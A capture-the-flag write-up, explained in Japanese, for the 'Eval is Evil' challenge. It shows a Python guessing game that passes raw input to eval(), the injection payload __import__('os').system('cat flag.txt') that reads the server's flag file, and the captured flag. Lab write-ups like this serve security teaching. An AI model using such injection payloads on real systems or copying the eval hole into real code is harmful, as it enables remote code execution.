# Eval is Evil

If eval is so bad, then why is it so easy to use?

nc evalisevil.kctf-453514-codelab.kctf.cloud 1337

chall.py 
```
import random

def main():
    
    print("Let's play a game, I am thinking of a number between 0 and", 2 ** 64, "\n")

    try:
        guess = eval(input("What is the number?: "))
    except:
        guess = 0

    correct = random.randint(0, 2**64)
    
    if (guess == correct):
        print("\nCorrect! You won the flag!")
        flag = open("flag.txt", "r").readline()
        print(flag)
    else:
        print("\nYou lost lol")

main()
```
- eval(input("What is the number?: ")) で入力を評価
- ランダムな数値 correct が生成され、入力した値と比較
- 一致すれば flag.txt からフラグが表示される


## solve
- eval() 関数を使っているので、数字以外の任意のPythonコードを実行できる

`__import__('os').system('cat flag.txt')`
osモジュールをインポートして、シェルコマンド cat flag.txt を実行し、フラグを直接表示させる

```
$ nc evalisevil.kctf-453514-codelab.kctf.cloud 1337
== proof-of-work: disabled ==
Let's play a game, I am thinking of a number between 0 and 18446744073709551616 

What is the number?: __import__('os').system('cat flag.txt')
wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}
```

## flag
`wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}`